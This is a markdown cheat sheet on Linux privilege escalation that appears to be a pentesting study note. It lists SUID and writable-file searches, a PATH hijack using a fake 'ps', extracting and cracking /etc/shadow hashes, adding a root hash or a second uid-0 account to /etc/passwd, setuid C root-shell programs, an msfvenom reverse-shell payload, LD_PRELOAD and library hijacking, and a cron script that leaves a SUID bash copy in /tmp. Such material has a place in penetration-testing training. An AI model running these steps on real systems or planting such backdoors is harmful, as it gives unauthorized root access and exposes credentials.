- [Find](#Find)
- [Services_behind_firewall/localhost](#Localhost_services)
- [PATH_Variable](#PATH_Variable)
- [SUID](#SUID)
- [Cronjob](#Cronjob)
- [Sudo](#Sudo)
- [NFS](#NFS)
- [Weak files permissions](#Weakfiles)
- [Services](#Services)
- [Kernel exploits](#Kernel)
- [Password](#Password)
- [Spawning Root Shells](#Spawning_root_shell)
- [Case_study_1](#case_study_1)
- [Tools](#Tools)
--------------------------------------------------------------------------------------------------------------------------------
# Find

### SUID
```
find / -perm -1000 -type d 2>/dev/null - Sticky bit
find / -perm -g=s -type f 2>/dev/null - SGID
find / -perm -u=s -type f 2>/dev/nul -SUID
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null - SUID or SGID
```
### Find writable files
```
- find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print 
- find / -writable -type d 2>/dev/null
- find / -writable -type f 2>/dev/null
- find / -perm -222 -type d 2>/dev/null
- find / -perm -o w -type d 2>/dev/null
- find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

### Find writable by current user
```
find / perm /u=w -user whoami 2>/dev/null
find / -perm /u+w,g+w -f -user whoami 2>/dev/null
find / -perm /u+w -user whoami 2>/dev/null
```

### Find readable files
```
find / -perm -2 ! -type l -ls 2>/dev/null
```

### Find  writable folder
```
find / -perm -o x -type d 2>/dev/null
```

### Find Writable & Executable files
```
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```
--------------------------------------------------------------------------------------------------------------------------------
# Localhost_services
```
netstat -ano
netstat -tulpn
```
--------------------------------------------------------------------------------------------------------------------------------
# PATH_Variable

#### Check the PATH
```
echo $PATH
```

#### case study one
- Binary file with SUID permission
  - check what the file do
  - for example *which linux commad use*
    - in our case we use *ps* command
- Create malicious file
  - echo "/bin/bash" or "/bin/sh" > /tmp/ps
  - chmod 777 /tmp/ps
  - *OR*
  - cp /bin/sh /tmp/ps
  - *OR*
  - ln -s /bin/sh /tmp/ps
    - export PATH=.:$PATH
- check PATH
  - echo $PATH
- change $PATH (add tmp folder)
  - export PATH=/tmp:$PATH
- run SUID binary
--------------------------------------------------------------------------------------------------------------------------------
# SUID
- SUID: executed with the privileges of the file owner
- SGID: executed with the privileges of the file group

#### Searching SUID file (SUID file is a special type of file permission given to a file
- find / -perm -u=s -type f 2>/dev/null
- find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} ; 2> /dev/null
- find / -perm -4000 -type f 2>/dev/null
- find / -uid 0 -perm -4000 -type f 2>/dev/null
- find / -type f -perm -g+s -exec ls -ald {} \; 2>/dev/null
- find / -user root -perm -002 -type f -not -path "/" 2>/dev/null
- find / -writable -type f 2>/dev/null>

### tip 'check suid/sgid files data'

#### Use strace for track suid file execute
```
strace /suid/file/path 2>&1 | grep -iE "open|access|no such file"
strace -v -f -e execve /suid/file/path 2>&1 | grep service
```
--------------------------------------------------------------------------------------------------------------------------------
# Cronjobs 
```
crontab -l
ls -alh /var/spool/cron
ls -alh /var/spool/crontabs
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root 
```

#### PATH Environment Variable
```
crontab *PATH* env variable is by default set to /usr/bin:/bin
The PATH variable can be overwritten in the crontab file
If the cron job progam/script does not use an absolute path and one of the PATH directories is wrtietable by our user, we my be able to crete a program/script with the same name as the cron job
```
# Sudo

### Useful commands
- Run program using sudo
  - sudo [program]
- Run porgram as specific user
  - sudo -u [username] [program]
- List programs a user allowed to run:
  - sudo -l

#### Other way to privileges
- sudo -s
- sudo -i 
- sudo /bin/bash
- sudo passwd

#### gtfobins
- https://gtfobins.github.io/

# NFS

# Weak_files_permission

### Find all writeable files (maxdepth 1)
```
find /etc -maxdepth 1 -writable -type f
```
### Find all readable files (maxdepth 1)
```
find /etc -maxdepth 1 -readable -type f
```

### Find all directories which can be written to:
```
find / -executable -writable -type d 2> /dev/null
```

### Readable and writeable files 
- /etc/shadow
  - If we are able to read the content of the shadow file, we might be able to crack the root user’s password hash.
  - If we are able to modify the shadow file, we can replace the root users password hash with one we know.  
- Check the permission of the /etc/shadow
```
ls -l /etc/shadow
```
- Extrackt the root users passwdord hash
```
head -n 1 /etc/shadow
```
- Crack the password hash
```
echo '$hash' > hash.txt'
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- /etc/passwd 
  - For backwards compatibility, if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow. If we can write to /etc/passwd, we can easily enter a known password hash for
the root user, and then use the su command to switch to the root user. Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries
for the same user ID, as long as the usernames are different.

- Structure:
```
root:x:0:0:root:/root:/bin/bash
```
The x in second filed instructs Linux to look for the password hash in /etc/shadow. In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password/
```
root::0:0:root:/root:/bin/bash
```
- Check the permissions of the /etc/password file (look for world writeable)
```
ls -la /etc/passw
```
- Generate a password hash for the password via openssl
```
openssl passwd "password"
L9yLGxncbOROc
```
- Edit /etc/passwd file and enter the hash in the second field of the root user row
```
root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```
- Log in as root

- Alternatively, append a new row to /etc/passwd
```
newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```

### Backups files
- common places for searching
  - ls -la /home
  - ls -la /root
  - ls -la /tmp
  - ls -la /var/backups
  
 - confirm that root logins are even allowed via SSH
 ```
 grep PermitRootLogin /etc/ssh/sshd_config
 ```
 -----------------------------------------------------------------------------------------------------
# Services

#### Available services
- netstat -anlp
- netstat -ano

#### Running services
- ps aux | grep root
- ps -ef | grep root
- top
- cat /etc/services

#### Services misconfigured
- cat /etc/syslog.conf
- cat /etc/chttp.conf
- cat /etc/lighttpd.conf
- cat /etc/cups/cupsd.conf
- cat /etc/inetd.conf
- cat /etc/apache2/apache2.conf
- cat /etc/my.conf
- cat /etc/httpd/conf/httpd.conf
- cat /opt/lampp/etc/httpd.conf
- ls -aRl /etc/ | awk '$1 ~ /^.*r.*/

#### Program version
- [program] --version
- [program] -v
- On debian distro, dpkg shows installed programs and their version
  - dpkg -l | grep [program]
- On systems that use rpm, the fallowing achieves the same
  - rpm -qa | grep [program]

##### Example
```
myqld --version
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Kernel

-------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Password
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Spawing_root_shells
binary
```
owned by the root user, and has the SUID bit set
int main() {
  setuid(0);
  system("/bin/bash -p");
}
gcc -o <name> <filename.c>
```
msfvenom
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf >
shell.elf

This reverse shell can be caught using netcat or metasploit’s own multi/handler.
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
#### Environment Variables
##### Program run through sudo can inherit the environment variables from the user's environment
in sudowrs config file if env_reset option is set sudo will run programs in a new, miniml env
config options are display when running sudo -l

### LD_PRELOAD
is an environment variable can be set to path of shared object (.so) file
When  set, the shared object will be loaded before any others.
By creating a custom .so and creating init() function, we can execute code as soon as teh object is loaded

sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option

LD_PRELOAD will no work if the real user id is defferent from the effective user ID


##### LD_LIBRARY_PATH: env variable contains a set of directories where shared libraries are searched for first

ldd command can be used to pritn the shared libraries
```
ldd /usr/sbin/apache2
```
by createing a shared library with the same name as one used by a program  and setting LD_library_path to its parent  the program will load our shared_library instead 


#### PATH Environment Variable case study
```
for PATH=/home/user
create file in /home/user
content: 
 #!/bin/bash
 cp /bin/bash /tmp/rootbash
 chmod +s /tmp/rootbash
 chmod +s file.sh
 
 wait: watch -n 1 ls -l /tmp
```

#### Wildcards
--------------------------------------------------------------------------------------------------------------------------------
# Case_study_1
### Create usefull C file
```
int main()
{
  setuid(0);
  system("/bin/bash -p");
}
```
```
int main()
{
  setuid(0);
  setgid(0);
  execl("/bin/sh", "sh", 0)
}
```
gcc -o [name] [filename.c]
--------------------------------------------------------------------------------------------------------------------------------
# Tools

### Run usefull script for linux enumeration
- ***Linenum***: https://github.com/rebootuser/LinEnum
- ***Linuxprivchecker***: https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
- ***LinuxExploitSuggester***: https://github.com/mzet-/linux-exploit-suggester
- ***LinuxExploitSuggester2***: https://github.com/jondonas/linux-exploit-suggester-2
- ***LinuxPrivChecker***: https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
- ***LinuxSmartEnumeration***: https://github.com/diego-treitos/linux-smart-enumeration
